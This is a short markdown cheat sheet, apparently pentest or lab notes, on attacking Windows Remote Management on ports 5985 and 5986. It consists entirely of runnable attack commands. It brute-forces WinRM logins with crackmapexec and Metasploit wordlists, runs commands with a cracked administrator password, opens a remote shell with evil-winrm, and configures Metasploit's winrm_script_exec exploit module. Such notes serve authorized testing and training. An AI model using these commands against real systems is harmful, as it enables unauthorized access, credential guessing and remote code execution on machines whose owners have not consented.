# Exploiting WinRM (Windows Remote Management) -5985


__brute force attack__
- `crackmapexec winrm <target ip> -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`


__executing__
- `crackmapexec winrm 10.5.17.237 -u administrator -p tinkerbell -x "dir"`


__Getting command shell__
- `evil-winrm.rb -u administrator -p 'tinkerbell' -i <target ip>`

__automatic__
```
service postgresql start && msfconsole
use exploit/windows/winrm/winrm_script_exec
set rhost,username,password
exploit
```


# Exploiting WinRM (5985 and 5986)
```
msfconsole
use auxiliary/scanner/winrm/winrm_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```
```
use auxiliary/scanner/winrm/winrm_cmd
```

```
search winrm
use exploit/windows/winrm/winrm_script_exec
set rhosts <target_ip>
set username administrator
set password password@123
set FORCE_VBS true
```


